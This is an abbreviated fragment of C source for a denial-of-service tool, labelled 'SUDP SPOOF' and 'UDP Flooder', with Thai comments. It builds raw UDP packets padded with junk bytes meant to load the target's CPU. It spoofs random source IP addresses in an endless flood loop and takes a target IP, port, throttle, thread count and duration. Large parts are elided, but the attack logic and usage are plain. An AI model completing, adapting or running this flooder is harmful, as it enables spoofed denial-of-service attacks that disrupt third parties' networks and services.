...
/* function for header checksums */ // เช็คที่มา
...
void setup_udp_header(struct udphdr *udph)
{
  ...
  data = replStr("\xFF" "\xFF" "\xFF" "\xFF", 256); //date กินCPUเครื่อง
  udph->len=htons(1028);
}
...
void *flood(void *par1)
{
  ...
  if(throttle == 0){
    while(1){
      ...
      ul_dst = (random_num >> 24 & 0xFF) << 24 | //สปูฟip
...
{
  if(argc < 5){
    fprintf(stderr, "SUDP SPOOF\n");
    fprintf(stdout, "UDP Flooder\nUsage: %s <IP> <Port> <Throttle> <Threads> <Time>\n", argv[0]);
    exit(-1);
  }
